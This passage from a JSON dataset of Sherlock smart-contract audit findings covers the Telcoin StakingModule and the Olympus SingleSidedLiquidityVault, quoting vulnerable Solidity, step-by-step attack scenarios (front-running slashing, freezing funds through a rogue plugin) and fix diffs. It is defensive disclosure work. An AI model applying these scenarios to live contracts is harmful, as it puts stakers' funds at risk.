      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Telcoin Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-telcoin-judging/issues/54",
      "tags": [],
      "finders": [
        "Tricko",
        "dipp"
      ]
    },
    {
      "id": "6667",
      "title": "M-1: Account that is affiliated with a plugin can sometimes evade slashing",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-telcoin-judging/issues/62 \n\n## Found by \nhyh\n\n## Summary\n\nRogue plugin can be a big staker itself or can collide with one and allow such staker to evade slashing in a number of scenarios, i.e. reduce the probability of slashing execution.\n\n## Vulnerability Detail\n\nIn order to achieve that the `plugin` can behave otherwise normally in all regards, but on observing staked amount reduction for a specific `account` it can revert `IPlugin(plugin).requiresNotification()`.\n\nIf a given `account` also partially mitigate the existence of `withdrawalDelay > 0` with the periodic renewal of withdrawal requests (without using any, just to have some window available), the overall probability of it to be able to withdraw while `plugin` is still in the system is noticeable.\n\nThis way the overall scenario is:\n\n1. `plugin` and `account` collide and set up the monitoring\n2. SLASHER's slash() for `account` is front-run with `plugin` tx switching its state so it is now reverting on `IPlugin(plugin).requiresNotification()`\n3. slash() is reverted this way, `plugin` switches to a normal state (it basically sandwiches slashing with two txs, own state change forth and back)\n4. SLASHER investigate with PLUGIN_EDITOR who the reverting plugin is\n5. Meanwhile withdraw window `account` has requested beforehand is approaching and if it occurs before PLUGIN_EDITOR removes a plugin (the ability to do so is an another issue, here we suppose it's fixed and plugin is removable) the `account` will be able to withdraw fully\n6. `account` exit() executes as `plugin` is in normal state and doesn't block anything\n\n## Impact\n\n`account` have some chance to evade the slashing, withdrawing the whole stake before slashing can occur.\n\nWith the growth of the protocol and increasing of the number of plugins this probability will gradually raise as volatile behavior of a particular plugin can be more tricky to identify which can provide enough time for an `account`.\n\nThe cost of being removed can be bearable for `plugin` provided that the `account` stake saved is big enough.\n\n## Code Snippet\n\nPlugin can revert the `IPlugin(plugin).requiresNotification()` call:\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L485-L498\n\n```solidity\n    /// @dev Calls `notifyStakeChange` on all plugins that require it. This is done in case any given plugin needs to do some stuff when a user exits.\n    /// @param account Account that is exiting\n    function _notifyStakeChangeAllPlugins(address account, uint256 amountBefore, uint256 amountAfter) private {\n        // loop over all plugins\n        for (uint256 i = 0; i < nPlugins; i++) {\n            // only notify if the plugin requires\n>>          if (IPlugin(plugins[i]).requiresNotification()) {\n                try IPlugin(plugins[i]).notifyStakeChange(account, amountBefore, amountAfter) {}\n                catch {\n                    emit StakeChangeNotificationFailed(plugins[i]);\n                }\n            }\n        }\n    }\n```\n\nIt will prohibit slashing as slash() calls _claimAndExit() that invokes _notifyStakeChangeAllPlugins():\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L510-L513\n\n```solidity\n    function slash(address account, uint amount, address to, bytes calldata auxData) external onlyRole(SLASHER_ROLE) nonReentrant {\n        _claimAndExit(account, amount, to, auxData);\n        emit Slashed(account, amount);\n    }\n```\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L460-L471\n\n```solidity\n    function _claimAndExit(address account, uint256 amount, address to, bytes calldata auxData) private checkpointProtection(account) {\n        require(amount <= balanceOf(account, auxData), \"Account has insufficient balance\");\n\n        // keep track of initial stake\n        uint256 oldStake = _stakes[account].latest();\n        // xClaimed = total amount claimed\n        uint256 xClaimed = _claim(account, address(this), auxData);\n\n        uint256 newStake = oldStake + xClaimed - amount;\n\n        // notify all plugins that account's stake has changed (if the plugin requires)\n>>      _notifyStakeChangeAllPlugins(account, oldStake, newStake);\n```\n\nIf there is a `withdrawalDelay` the `account` can routinely renew withdrawal requests:\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L231-L236\n\n```solidity\n    function requestWithdrawal() external {\n        require(withdrawalDelay > 0, \"StakingModule: Withdrawal delay is 0\");\n        require(block.timestamp > withdrawalRequestTimestamps[msg.sender] + withdrawalDelay + withdrawalWindow, \"StakingModule: Withdrawal already pending\");\n\n        withdrawalRequestTimestamps[msg.sender] = block.timestamp;\n    }\n```\n\nThis way there is a chance that `account` will be able to withdraw while SLASHER locates the reason of blocking and communicate with PLUGIN_EDITOR in order to remove the `plugin`.\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider adding `try-catch` to the requiresNotification() call, for example:\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L485-L498\n\n```diff\n    /// @dev Calls `notifyStakeChange` on all plugins that require it. This is done in case any given plugin needs to do some stuff when a user exits.\n    /// @param account Account that is exiting\n    function _notifyStakeChangeAllPlugins(address account, uint256 amountBefore, uint256 amountAfter) private {\n        // loop over all plugins\n        for (uint256 i = 0; i < nPlugins; i++) {\n            // only notify if the plugin requires\n-           if (IPlugin(plugins[i]).requiresNotification()) {\n+           bool notificationRequired;\n+           try IPlugin(plugins[i]).requiresNotification() returns (bool req) { notificationRequired = req; }\n+           catch  { emit StakeChangeNotificationFailed(plugins[i]); }\n+           if (notificationRequired) {\n                try IPlugin(plugins[i]).notifyStakeChange(account, amountBefore, amountAfter) {}\n                catch {\n                    emit StakeChangeNotificationFailed(plugins[i]);\n                }\n            }\n        }\n    }\n```\n\n## Discussion\n\n**amshirif**\n\nhttps://github.com/telcoin/telcoin-audit/pull/5\n\n**dmitriia**\n\nLooks ok",
      "summary": "\nThis bug report is about an issue in which an account affiliated with a plugin can sometimes evade slashing. The vulnerability detail explains that the plugin can revert the IPlugin(plugin).requiresNotification() call which will prohibit slashing as slash() calls _claimAndExit() that invokes _notifyStakeChangeAllPlugins(). If there is a withdrawalDelay, the account can routinely renew withdrawal requests and be able to withdraw while the SLASHER locates the reason of blocking and communicates with PLUGIN_EDITOR in order to remove the plugin. The impact of this issue is that the account has some chance to evade the slashing, withdrawing the whole stake before slashing can occur.\n\nThe recommendation given is to consider adding try-catch to the requiresNotification() call. This will help to identify any issues with the plugin more easily and prevent the account from evading slashing.\n\nOverall, this bug report explains an issue in which an account affiliated with a plugin can sometimes evade slashing. The vulnerability detail explains the process of how this is possible, the impact it has and the recommendation given to fix the issue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Telcoin Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-telcoin-judging/issues/62",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "6666",
      "title": "H-1: Rogue plugin can become unremovable and halt all staking and claiming",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-telcoin-judging/issues/67 \n\n## Found by \nhyh\n\n## Summary\n\nStakingModule's plugin that turned rogue can deny any attempts of its removal and can effectively stop the contract, disturbing the whole range of StakingModule operations.\n\nI.e. if any plugin turns malicious due to bug or upgrade altering its functionality vs one that was in place as of the time of its addition to StakingModule, such malicious plugin can halt StakingModule and freeze all the funds staked.\n\n## Vulnerability Detail\n\nThe reason is removePlugins() having `require(IPlugin(plugin).deactivated())` condition, which success is required.\n\nSuppose that a plugin turned malicious (as a result of a bug or by owner's intent via upgrade), begin to permanently return `false` for the `deactivated()` call.\n\nAnd, for instance, it can simultaneously return `2**256-1` in claim() to overflow the sum and revert the `IPlugin(plugin).requiresNotification()` calls.\n\n## Impact\n\nAs all StakingModule operations will be frozen and funds withdrawal be unavailable in this scenario it will be permanent freeze of funds for all the stakers.\n\n## Code Snippet\n\nIf a plugin turns rogue:\n\nIt can return `2**256-1` in claim() to overflow the sum:\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L353-L366\n\n```solidity\n    function _claim(address account, address to, bytes calldata auxData) private returns (uint256) {\n        // balance of `to` before claiming\n        uint256 balBefore = IERC20Upgradeable(tel).balanceOf(to);\n\n        // call claim on all plugins and count the total amount claimed\n        uint256 total;\n        bytes[] memory parsedAuxData = parseAuxData(auxData);\n        for (uint256 i = 0; i < nPlugins; i++) {\n>>          try IPlugin(plugins[i]).claim(account, to, parsedAuxData[i]) returns (uint256 xClaimed) {\n                total += xClaimed;\n            } catch  {\n                emit PluginClaimFailed(plugins[i]);\n            }\n        }\n```\n\nThis will block slash(), claim(), fullClaimAndExit(), partialClaimAndExit() functions.\n\nAlso, it can revert the `IPlugin(plugin).requiresNotification()` call:\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L485-L498\n\n```solidity\n    /// @dev Calls `notifyStakeChange` on all plugins that require it. This is done in case any given plugin needs to do some stuff when a user exits.\n    /// @param account Account that is exiting\n    function _notifyStakeChangeAllPlugins(address account, uint256 amountBefore, uint256 amountAfter) private {\n        // loop over all plugins\n        for (uint256 i = 0; i < nPlugins; i++) {\n            // only notify if the plugin requires\n>>          if (IPlugin(plugins[i]).requiresNotification()) {\n                try IPlugin(plugins[i]).notifyStakeChange(account, amountBefore, amountAfter) {}\n                catch {\n                    emit StakeChangeNotificationFailed(plugins[i]);\n                }\n            }\n        }\n    }\n```\n\nIt will also block stake(), partialExit(), exit(), and migration claimAndExitFor(), stakeFor() functions.\n\nAs all involve _notifyStakeChangeAllPlugins(), for example:\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L573-L575\n\n```solidity\n    function claimAndExitFor(address account, address to, bytes calldata auxData) external onlyRole(MIGRATOR_ROLE) nonReentrant returns (uint256, uint256) {\n>>      return (_claim(account, to, auxData), _exit(account, to));\n    }\n```\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L388-L406\n\n```solidity\n    function _exit(address account, address to) private returns (uint256) {\n        uint256 stakedAmt = _stakes[account].latest();\n\n>>      _partialExit(account, to, stakedAmt);\n\n        return stakedAmt;\n    }\n\n    function _partialExit(address account, address to, uint256 exitAmount) private checkpointProtection(account) {\n        if (exitAmount == 0) {\n            return;\n        }\n\n        uint256 stakedAmt = _stakes[account].latest();\n\n        require(stakedAmt >= exitAmount, \"StakingMoudle: Cannot exit more than is staked\");\n\n        // notify plugins\n>>      _notifyStakeChangeAllPlugins(account, stakedAmt, stakedAmt - exitAmount);\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider adding `force` option to removePlugin(), for example:\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L542-L555\n\n```diff\n    /// @notice Removes a plugin\n-   function removePlugin(uint256 index) external onlyRole(PLUGIN_EDITOR_ROLE) {\n+   function removePlugin(uint256 index, bool force) external onlyRole(PLUGIN_EDITOR_ROLE) {\n        address plugin = plugins[index];\n\n-       require(IPlugin(plugin).deactivated(), \"StakingModule::removePlugin: Plugin is not deactivated\");\n+       require(force || IPlugin(plugin).deactivated(), \"StakingModule::removePlugin: Plugin is not deactivated\");\n\n        pluginsMapping[plugin] = false;\n        plugins[index] = plugins[nPlugins - 1];\n        pluginIndicies[plugins[index]] = index;\n        plugins.pop();\n        nPlugins--;\n\n        emit PluginRemoved(plugin, nPlugins);\n    }\n```\n\n## Discussion\n\n**dmitriia**\n\nLooks ok",
      "summary": "\nThis bug report is about a vulnerability found in the StakingModule contract, which is part of the Telcoin Audit. If a plugin turns malicious due to a bug or upgrade, it can return false for the deactivated() call and return 2**256-1 in the claim() call, which will overflow the sum and revert the IPlugin(plugin).requiresNotification() calls. This would cause all StakingModule operations to be frozen, making it impossible for stakers to withdraw their funds. The code snippet provided in the report shows how this can happen. The report recommends adding a force option to the removePlugin() function, which would allow the malicious plugin to be removed. The discussion section shows that the recommendation is accepted.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Telcoin Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-telcoin-judging/issues/67",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "6686",
      "title": "M-10: SingleSidedLiquidityVault._accumulateInternalRewards will revert with underflow error if rewardToken.lastRewardTime is bigger than current time",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/44 \n\n## Found by \njoestakey, cccz, mahdikarimi, xAlismx, hansfriese, GimelSec, cducrest-brainbot, 0x52, Ruhum, rvierdiiev\n\n## Summary\nSingleSidedLiquidityVault._accumulateInternalRewards will revert with underflow error if rewardToken.lastRewardTime is bigger than current time\n## Vulnerability Detail\nFunction `_accumulateInternalRewards` is used by almost all external function of SingleSidedLiquidityVault.\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L463-L484\n```solidity\n    function _accumulateInternalRewards() internal view returns (uint256[] memory) {\n        uint256 numInternalRewardTokens = internalRewardTokens.length;\n        uint256[] memory accumulatedInternalRewards = new uint256[](numInternalRewardTokens);\n\n\n        for (uint256 i; i < numInternalRewardTokens; ) {\n            InternalRewardToken memory rewardToken = internalRewardTokens[i];\n\n\n            uint256 totalRewards;\n            if (totalLP > 0) {\n                uint256 timeDiff = block.timestamp - rewardToken.lastRewardTime;\n                totalRewards = (timeDiff * rewardToken.rewardsPerSecond);\n            }\n\n\n            accumulatedInternalRewards[i] = totalRewards;\n\n\n            unchecked {\n                ++i;\n            }\n        }\n\n\n        return accumulatedInternalRewards;\n    }\n```\nThe line is needed to see is this `uint256 timeDiff = block.timestamp - rewardToken.lastRewardTime`. In case if `rewardToken.lastRewardTime > block.timestamp` than function will revert and ddos functions that use it.\n\nThis is how this can happen.\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L674-L688\n```solidity\n    function addInternalRewardToken(\n        address token_,\n        uint256 rewardsPerSecond_,\n        uint256 startTimestamp_\n    ) external onlyRole(\"liquidityvault_admin\") {\n        InternalRewardToken memory newInternalRewardToken = InternalRewardToken({\n            token: token_,\n            decimalsAdjustment: 10**ERC20(token_).decimals(),\n            rewardsPerSecond: rewardsPerSecond_,\n            lastRewardTime: block.timestamp > startTimestamp_ ? block.timestamp : startTimestamp_,\n            accumulatedRewardsPerShare: 0\n        });\n\n\n        internalRewardTokens.push(newInternalRewardToken);\n    }\n```\nIn case if `startTimestamp_` is in the future, then it will be set and cause that problem.\n`lastRewardTime: block.timestamp > startTimestamp_ ? block.timestamp : startTimestamp_`.\n\nNow till, `startTimestamp_` time,  `_accumulateInternalRewards` will not work, so vault will be stopped. \nAnd of course, admin can remove that token and everything will be fine. That's why i think this is medium.\n## Impact\nSingleSidedLiquidityVault will be blocked\n## Code Snippet\nProvided above.\n## Tool used\n\nManual Review\n\n## Recommendation\nSkip token if it's `lastRewardTime` is in future.",
      "summary": "\nA vulnerability was found in SingleSidedLiquidityVault._accumulateInternalRewards which will cause the function to revert with an underflow error if rewardToken.lastRewardTime is bigger than the current time. This was discovered by joestakey, cccz, mahdikarimi, xAlismx, hansfriese, GimelSec, cducrest-brainbot, 0x52, Ruhum, and rvierdiiev during a manual review.\n\nThe issue is caused by the line `uint256 timeDiff = block.timestamp - rewardToken.lastRewardTime` in the _accumulateInternalRewards function which is used by almost all external functions of SingleSidedLiquidityVault. The problem can occur if the startTimestamp_ parameter is set to a time in the future in the addInternalRewardToken function. As a result, the vault will be blocked until the startTimestamp_ time.\n\nThe recommendation to fix this issue is to skip token if its lastRewardTime is in the future.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Olympusdao",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-olympus-judging/issues/44",
      "tags": [],
      "finders": [
        "0x52",
        "cccz",
        "joestakey",
        "cducrest-brainbot",
        "Ruhum",
        "mahdikarimi",
        "hansfriese",
        "xAlismx",
        "rvierdiiev",
        "GimelSec"
      ]
    },
    {
      "id": "6685",
      "title": "M-9: claimFees may cause some external rewards to be locked in the contract",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/100 \n\n## Found by \ncccz\n\n## Summary\nclaimFees will update rewardToken.lastBalance so that if there are unaccrued reward tokens in the contract, users will not be able to claim them.\n## Vulnerability Detail\n_accumulateExternalRewards takes the difference between the contract's reward token balance and lastBalance as the reward.\nand the accumulated reward tokens are updated by _updateExternalRewardState.\n```solidity\n    function _accumulateExternalRewards() internal override returns (uint256[] memory) {\n        uint256 numExternalRewards = externalRewardTokens.length;\n\n        auraPool.rewardsPool.getReward(address(this), true);\n\n        uint256[] memory rewards = new uint256[](numExternalRewards);\n        for (uint256 i; i < numExternalRewards; ) {\n            ExternalRewardToken storage rewardToken = externalRewardTokens[i];\n            uint256 newBalance = ERC20(rewardToken.token).balanceOf(address(this));\n\n            // This shouldn't happen but adding a sanity check in case\n            if (newBalance < rewardToken.lastBalance) {\n                emit LiquidityVault_ExternalAccumulationError(rewardToken.token);\n                continue;\n            }\n\n            rewards[i] = newBalance - rewardToken.lastBalance;\n            rewardToken.lastBalance = newBalance;\n\n            unchecked {\n                ++i;\n            }\n        }\n        return rewards;\n    }\n...\n    function _updateExternalRewardState(uint256 id_, uint256 amountAccumulated_) internal {\n        // This correctly uses 1e18 because the LP tokens of all major DEXs have 18 decimals\n        if (totalLP != 0)\n            externalRewardTokens[id_].accumulatedRewardsPerShare +=\n                (amountAccumulated_ * 1e18) /\n                totalLP;\n    }\n\n```\nauraPool.rewardsPool.getReward can be called by anyone to send the reward tokens to the contract\n```solidity\n    function getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){\n        uint256 reward = earned(_account);\n        if (reward > 0) {\n            rewards[_account] = 0;\n            rewardToken.safeTransfer(_account, reward);\n            IDeposit(operator).rewardClaimed(pid, _account, reward);\n            emit RewardPaid(_account, reward);\n        }\n\n        //also get rewards from linked rewards\n        if(_claimExtras){\n            for(uint i=0; i < extraRewards.length; i++){\n                IRewards(extraRewards[i]).getReward(_account);\n            }\n        }\n        return true;\n    }\n```\nHowever, in claimFees, the rewardToken.lastBalance will be updated to the current contract balance after the admin has claimed the fees.\n```solidity\n    function claimFees() external onlyRole(\"liquidityvault_admin\") {\n        uint256 numInternalRewardTokens = internalRewardTokens.length;\n        uint256 numExternalRewardTokens = externalRewardTokens.length;\n\n        for (uint256 i; i < numInternalRewardTokens; ) {\n            address rewardToken = internalRewardTokens[i].token;\n            uint256 feeToSend = accumulatedFees[rewardToken];\n\n            accumulatedFees[rewardToken] = 0;\n\n            ERC20(rewardToken).safeTransfer(msg.sender, feeToSend);\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        for (uint256 i; i < numExternalRewardTokens; ) {\n            ExternalRewardToken storage rewardToken = externalRewardTokens[i];\n            uint256 feeToSend = accumulatedFees[rewardToken.token];\n\n            accumulatedFees[rewardToken.token] = 0;\n\n            ERC20(rewardToken.token).safeTransfer(msg.sender, feeToSend);\n            rewardToken.lastBalance = ERC20(rewardToken.token).balanceOf(address(this));\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n```\nConsider the following scenario.\n1. Start with rewardToken.lastBalance = 200.\n2. After some time, the rewardToken in aura is increased by 100.\n3. Someone calls getReward to claim the reward tokens to the contract, and the 100 reward tokens increased have not yet been accumulated via _accumulateExternalRewards and _updateExternalRewardState.\n4. The admin calls claimFees to update rewardToken.lastBalance to 290(10 as fees).\n5. Users call claimRewards and receives 0 reward tokens. 90 reward tokens will be locked in the contract\n## Impact\nIt will cause some external rewards to be locked in the contract\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/WstethLiquidityVault.sol#L192-L216\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L496-L503\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L736-L766\n## Tool used\n\nManual Review\n\n## Recommendation\nUse _accumulateExternalRewards and _updateExternalRewardState in claimFees to accrue rewards.\n```diff\n    function claimFees() external onlyRole(\"liquidityvault_admin\") {\n        uint256 numInternalRewardTokens = internalRewardTokens.length;\n        uint256 numExternalRewardTokens = externalRewardTokens.length;\n\n        for (uint256 i; i < numInternalRewardTokens; ) {\n            address rewardToken = internalRewardTokens[i].token;\n            uint256 feeToSend = accumulatedFees[rewardToken];\n\n            accumulatedFees[rewardToken] = 0;\n\n            ERC20(rewardToken).safeTransfer(msg.sender, feeToSend);\n\n            unchecked {\n                ++i;\n            }\n        }\n+       uint256[] memory accumulatedExternalRewards = _accumulateExternalRewards();\n        for (uint256 i; i < numExternalRewardTokens; ) {\n+           _updateExternalRewardState(i, accumulatedExternalRewards[i]);\n            ExternalRewardToken storage rewardToken = externalRewardTokens[i];\n            uint256 feeToSend = accumulatedFees[rewardToken.token];\n\n            accumulatedFees[rewardToken.token] = 0;\n\n            ERC20(rewardToken.token).safeTransfer(msg.sender, feeToSend);\n            rewardToken.lastBalance = ERC20(rewardToken.token).balanceOf(address(this));\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n```\n\n## Discussion\n\n**IAm0x52**\n\nEscalate for 25 USDC.\n\nThis should be medium for two reasons:\n\n1) Funds aren't actually lost because they can be rescued\n2) This is an admin only function so unless admin was malicious and called this repeatedly the amount of locked tokens would be small\n\n**sherlock-admin**\n\n > Escalate for 25 USDC.\n> \n> This should be medium for two reasons:\n> \n> 1) Funds aren't actually lost because they can be rescued\n> 2) This is an admin only function so unless admin was malicious and called this repeatedly the amount of locked tokens would be small\n\nYou've created a valid escalation for 25 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**thereksfour**\n\nEscalate for 25 USDC.\nDisagree with @IAm0x52 's comments\n\n> 1.Funds aren't actually lost because they can be rescued\n\nFor users, they have lost the rewards they deserve, and even though they can get a refund afterwards, the reputation of the protocol has been compromised.\n\n> 2.This is an admin only function so unless admin was malicious and called this repeatedly the amount of locked tokens would be small.\n\nUsing minimum impact to downgrade the issue here doesn't hold water.  I could say that a large number of rewards are left in aura due to a long period of no user activity, and when a malicious user observes the owner calling claimFees, he can preempt the call to getReward to make a large number of rewards locked in the contract\n\n**sherlock-admin**\n\n > Escalate for 25 USDC.\n> Disagree with @IAm0x52 's comments\n> \n> > 1.Funds aren't actually lost because they can be rescued\n> \n> For users, they have lost the rewards they deserve, and even though they can get a refund afterwards, the reputation of the protocol has been compromised.\n> \n> > 2.This is an admin only function so unless admin was malicious and called this repeatedly the amount of locked tokens would be small.\n> \n> Using minimum impact to downgrade the issue here doesn't hold water.  I could say that a large number of rewards are left in aura due to a long period of no user activity, and when a malicious user observes the owner calling claimFees, he can preempt the call to getReward to make a large number of rewards locked in the contract\n\nYou've created a valid escalation for 25 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted\n\nThis is a valid medium\nThere are multiple reasons why this issue should be medium, \nWhile there is still a dos attack possible, funds are not lost. And can be recovered by admin.\nAlso, the claimFees is an admin function. \nThis does not break the core functionality but a DOS of rewards. Hence medium is fair\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> This is a valid medium\n> There are multiple reasons why this issue should be medium, \n> While there is still a dos attack possible, funds are not lost. And can be recovered by admin.\n> Also, the claimFees is an admin function. \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue with the claimFees function in the WstethLiquidityVault contract in the Olympus protocol. This function updates the rewardToken.lastBalance, which can cause some external rewards to be locked in the contract if someone calls getReward to claim the reward tokens to the contract. This can happen if the rewardToken in aura is increased by some amount and the user has not yet been able to accumulate them via _accumulateExternalRewards and _updateExternalRewardState.\n\nThe impact of this issue is that some external rewards will be locked in the contract and users will not be able to claim them. This can cause the reputation of the protocol to be compromised.\n\nThe code snippets and tools used to detect this issue are provided in the report. The recommendation to fix this issue is to use _accumulateExternalRewards and _updateExternalRewardState in claimFees to accrue rewards.\n\nThe discussion section of this report includes escalations for 25 USDC from two different users, which were accepted by sherlock-admin. This means that contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Olympusdao",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-olympus-judging/issues/100",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "6684",
      "title": "M-8: SingleSidedLiquidityVault.withdraw will decreases ohmMinted, which will make the calculation involving ohmMinted incorrect",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/102 \n\n## Found by \njoestakey, cccz, psy4n0n, Bobface, jonatascm, immeas, favelanky, rvierdiiev\n\n## Summary\nSingleSidedLiquidityVault.withdraw will decreases ohmMinted, which will make the calculation involving ohmMinted incorrect.\n## Vulnerability Detail\nIn SingleSidedLiquidityVault, ohmMinted indicates the number of ohm minted in the contract, and ohmRemoved indicates the number of ohm burned in the contract.\nSo the contract just needs to increase ohmMinted in deposit() and increase ohmRemoved in withdraw().\nBut withdraw() decreases ohmMinted, which makes the calculation involving ohmMinted incorrect.\n```solidity\n        ohmMinted -= ohmReceived > ohmMinted ? ohmMinted : ohmReceived;\n        ohmRemoved += ohmReceived > ohmMinted ? ohmReceived - ohmMinted : 0;\n```\nConsider that a user minted 100 ohm in deposit() and immediately burned 100 ohm in withdraw().\n\nIn \\_canDeposit, the amount_ is less than LIMIT + 1000 instead of LIMIT \n```solidity\n    function _canDeposit(uint256 amount_) internal view virtual returns (bool) {\n        if (amount_ + ohmMinted > LIMIT + ohmRemoved) revert LiquidityVault_LimitViolation();\n        return true;\n    }\n\n```\ngetOhmEmissions() returns 1000 instead of 0\n```solidity\n    function getOhmEmissions() external view returns (uint256 emitted, uint256 removed) {\n        uint256 currentPoolOhmShare = _getPoolOhmShare();\n\n        if (ohmMinted > currentPoolOhmShare + ohmRemoved)\n            emitted = ohmMinted - currentPoolOhmShare - ohmRemoved;\n        else removed = currentPoolOhmShare + ohmRemoved - ohmMinted;\n    }\n```\n## Impact\nIt will make the calculation involving ohmMinted incorrect.\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L276-L277\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L392-L409\n## Tool used\n\nManual Review\n\n## Recommendation\n```diff\n    function withdraw(\n        uint256 lpAmount_,\n        uint256[] calldata minTokenAmounts_,\n        bool claim_\n    ) external onlyWhileActive nonReentrant returns (uint256) {\n        // Liquidity vaults should always be built around a two token pool so we can assume\n        // the array will always have two elements\n        if (lpAmount_ == 0 || minTokenAmounts_[0] == 0 || minTokenAmounts_[1] == 0)\n            revert LiquidityVault_InvalidParams();\n        if (!_isPoolSafe()) revert LiquidityVault_PoolImbalanced();\n\n        _withdrawUpdateRewardState(lpAmount_, claim_);\n\n        totalLP -= lpAmount_;\n        lpPositions[msg.sender] -= lpAmount_;\n\n        // Withdraw OHM and pairToken from LP\n        (uint256 ohmReceived, uint256 pairTokenReceived) = _withdraw(lpAmount_, minTokenAmounts_);\n\n        // Reduce deposit values\n        uint256 userDeposit = pairTokenDeposits[msg.sender];\n        pairTokenDeposits[msg.sender] -= pairTokenReceived > userDeposit\n            ? userDeposit\n            : pairTokenReceived;\n-       ohmMinted -= ohmReceived > ohmMinted ? ohmMinted : ohmReceived;\n        ohmRemoved += ohmReceived > ohmMinted ? ohmReceived - ohmMinted : 0;\n```",
      "summary": "\nThis bug report relates to the SingleSidedLiquidityVault.withdraw function, which decreases ohmMinted, making the calculation involving ohmMinted incorrect. This bug was found by joestakey, cccz, psy4n0n, Bobface, jonatascm, immeas, favelanky, and rvierdiiev. \n\nohmMinted indicates the number of ohm minted in the contract, and ohmRemoved indicates the number of ohm burned in the contract. The contract should increase ohmMinted in deposit() and increase ohmRemoved in withdraw(). However, withdraw() decreases ohmMinted, which makes the calculation involving ohmMinted incorrect. \n\nFor example, if a user mints 100 ohm in deposit() and immediately burns 100 ohm in withdraw(), \\_canDeposit will return an amount_ less than LIMIT + 1000 instead of LIMIT, and getOhmEmissions() will return 1000 instead of 0. \n\nThis bug impacts the calculation involving ohmMinted and could lead to incorrect results. The code snippets provided can be found at the following links: https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L276-L277, https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L392-L409. The recommendation to fix this bug is provided in the code snippet.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Olympusdao",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-olympus-judging/issues/102",
      "tags": [],
      "finders": [
        "Bobface",
        "psy4n0n",
        "immeas",
        "cccz",
        "joestakey",
